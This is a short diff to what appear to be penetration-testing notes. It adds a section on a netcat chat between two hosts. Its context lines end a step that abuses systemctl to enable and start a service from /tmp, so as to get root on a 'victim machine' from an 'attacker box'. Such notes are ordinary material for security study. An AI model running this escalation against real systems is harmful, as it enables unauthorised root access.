@@ -40,3 +40,17 @@ Now use systemctl on victim machine and we should be root from the attacker box:
 /bin/systemctl enable /tmp/fab.service
 /bin/systemctl start fab
 ```
+
+## Chat between two users
+
+User 1 (with IP 10.9.182.239) runs this command:
+
+```sh
+nc -l -p 3303
+```
+
+Other chat user then runs this command:
+
+```sh
+nc 10.9.182.239 3303
+```
